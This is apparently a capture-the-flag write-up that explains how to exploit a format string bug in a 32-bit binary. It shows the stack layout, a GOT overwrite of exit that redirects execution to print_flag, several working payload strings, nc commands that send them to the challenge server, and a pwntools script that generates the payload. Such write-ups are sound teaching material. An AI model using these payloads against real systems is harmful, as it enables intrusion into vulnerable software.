# Write-up

# ![](/assets/problem-statement.png)

---

Exploit a format string vulnerability

Flag: **gigem{F0RM@1NG\_1S\_H4RD}**

## Analysis

Suppose we run  the program with the string `AAAAAAAAAAAAAA`

When the program is on `printf`,

![](/assets/at-printf.png)

The stack looks like:

```
BFFFEDC0  BFFFEDD0  MEMORY:BFFFEDD0  <--- ESP (Pointer to our string)
BFFFEDC4  00000002  MEMORY:00000002  Dword 1
BFFFEDC8  00000000  MEMORY:00000000  Dword 2
BFFFEDCC  00000000  MEMORY:00000000  Dword 3
BFFFEDD0  41414141  MEMORY:41414141  <--- Our entered string
BFFFEDD4  41414141  MEMORY:41414141
BFFFEDD8  41414141  MEMORY:41414141
BFFFEDDC  00004141  MEMORY:00004141
```

* The top of the stack contains the pointer \(address\) to our entered string.
* After that there are 3 dwords \(12 bytes\) and then our string begins.

Thus when exploiting, our entered string can be considered as the 4th parameter to printf.

The function which prints the flag is located at `080485AB`. It is not called anywhere by the program. We have to somehow redirect the execution flow to there so that it prints our flag.

```nasm
.text:080485AB public print_flag
.text:080485AB print_flag proc near
.text:080485AB
.text:080485AB var_D= byte ptr -0Dh
.text:080485AB fp= dword ptr -0Ch
.text:080485AB
.text:080485AB push    ebp
.text:080485AC mov     ebp, esp
.text:080485AE sub     esp, 18h
.text:080485B1 sub     esp, 0Ch
.text:080485B4 push    offset s                        ; "This function has been deprecated"
.text:080485B9 call    _puts
.text:080485BE add     esp, 10h
.text:080485C1 sub     esp, 8
.text:080485C4 push    offset modes                    ; "r"
.text:080485C9 push    offset filename                 ; "flag.txt"
.text:080485CE call    _fopen
```

The Global Offset Table looks like:

```
.got.plt:0804A00C 64 A0 04 08 off_804A00C dd offset printf ; DATA XREF: _printfr
.got.plt:0804A010 68 A0 04 08 off_804A010 dd offset gets ; DATA XREF: _getsr
.got.plt:0804A014 6C A0 04 08 off_804A014 dd offset _IO_getc ; DATA XREF: __IO_getcr
.got.plt:0804A018 70 A0 04 08 off_804A018 dd offset puts ; DATA XREF: _putsr
.got.plt:0804A01C 74 A0 04 08 off_804A01C dd offset exit ; DATA XREF: _exitr
.got.plt:0804A020 78 A0 04 08 off_804A020 dd offset __libc_start_main
```

Later in the program after `printf` returns `exit` is called.  
If we modify the address of `exit` in the GOT with that of `print_flag`, it would be executed and we would get our flag.

The entry of `exit` in the GOT is at `0804A01C` and it contains the bytes `74 A0 04 08`.  
The address of `print_flag` in little endian byte order is `AB 85 04 08`.  
Hence we would only need to write the two bytes `AB 85` , as the remaining two are already properly set up.

Summarizing,

Write`0xAB`  \(171\) to `0804A01C`

Write `0x85` \(133\) to `0804A01D`

Since 133 &lt; 171, we can write 133 at `0804A01D` followed by 171 at `0804A01C`.  
\(The reverse is also possible where we have to use wrap around. More on this next\).

#### Building the exploit string

Our exploit string will start with the two addresses in little endian byte order.

```
    -------------8 bytes------------
    |               |              |
    |  1st address  | 2nd address  |
    |               |              |
    \x1d\xa0\x04\x08\x1c\xa0\x04\x08
```

This takes up 8 bytes.

The string is located at an offset of 12 bytes \(3 dwords\) from the pointer to itself \(See above\).  
To reach the start of the string on the stack we need to consume these 3 dwords.  
The format string that can be used is`%08x%08x%08x`

The exploit string generated till this point is

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08x
```

When this is passed to `printf`, the number of bytes it will display = 4 + 4 + 8 + 8 + 8 = 24

To reach 133, we still need to print `133 - 24 = 109` more bytes. We can append this 109 bytes to get:

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Alternatively, we can make the last or anyone of the `%08x` to display 109 bytes using space padding:

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x
```

Number of bytes displayed till now is 133. We can use the [format specifier](http://www.cplusplus.com/reference/cstdio/printf/) `%hhn` to write this value at the address specified. The address is a pointer to a variable and usually passed as an argument to `printf`. Here we have provided the address \(`0804A01D`\) at the beginning of the string itself.

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhn
```

`hh` is the **length sub-specifier** and it indicates to **write a byte value** i.e. the address is a pointer to a byte. If the value to write is larger than a byte, it would be automatically **wrapped**. The situation is similar for other length sub-specifiers such as `h`, `l` and `ll`. Without any length sub-specifier it defaults to `int`.

Now, at this point, we have written `0x85` \(133\) to the location `0804A01D`. In this process we have also displayed 133 bytes on the terminal.

The next task is to write `0xAB` \(171\) to the location `0804A01C` and for that we need to display `171 - 133 = 38` more bytes. These bytes can again be simply appended to the exploit string. Using this approach our exploit string would be:

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
```

```bash
$ python -c "print '\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn'" > exploit
$ nc pwn.ctf.tamu.edu 4323 < exploit
Enter a word to be echoed:
��0000000200000000                                                                                                            0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis function has been deprecated
gigem{F0RM@1NG_1S_H4RD}
```

#### Using positional arguments to printf

The exploit string can be shortened. We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`.

The exploit string in this case would be:

```
\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5$hhn
```

If we use python, we need to properly escape the string, the `$` symbols needs to be escaped:

```
$ python -c "print '\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4\$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5\$hhn'" > exploit

$ xxd exploit
0000000: 1da0 0408 1ca0 0408 2531 3235 7825 3424  ........%125x%4$
0000010: 6868 6e41 4141 4141 4141 4141 4141 4141  hhnAAAAAAAAAAAAA
0000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000030: 4141 4141 4141 4141 4125 3524 6868 6e0a  AAAAAAAAA%5$hhn.

$  nc pwn.ctf.tamu.edu 4323 < exploit
Enter a word to be echoed:
��                                  2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis function has been deprecated
gigem{F0RM@1NG_1S_H4RD}
```

#### Alternative approach instead of appending 38 A's

Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x`for referring to it. In addition other field width sub-specifier have to be reduced by 4.

```
\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%08x%08x%105x%hhn%38x%hhn
```

If we use positional arguments, the exploit string becomes even more shorter:

```
\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%121x%4$hhn%38x%6$hhn
```

Note that the positional arguments are `%4$hhn` and `%6$hhn`. This is because the 5th argument to printf is `DEADBEEF`

## Using pwntools \(automated\)

#### Generate the exploit

First parameter \(4\) indicates that the string is the 4th parameter.  
See the [pwntools docs](http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) for more info.

```py
from pwnlib.fmtstr import fmtstr_payload
open('exploit', 'w').write(fmtstr_payload(4, {0x0804a01c: 0x080485ab}, write_size='byte'))
```

#### Profit :\)

```bash
$ xxd exploit 
0000000: 1ca0 0408 1da0 0408 1ea0 0408 1fa0 0408  ................
0000010: 2531 3535 6325 3424 6868 6e25 3231 3863  %155c%4$hhn%218c
0000020: 2535 2468 686e 2531 3237 6325 3624 6868  %5$hhn%127c%6$hh
0000030: 6e25 3463 2537 2468 686e                 n%4c%7$hhn

$ nc pwn.ctf.tamu.edu 4323 < exploit
Enter a word to be echoed:
����                       This function has been deprecated
gigem{F0RM@1NG_1S_H4RD}
```



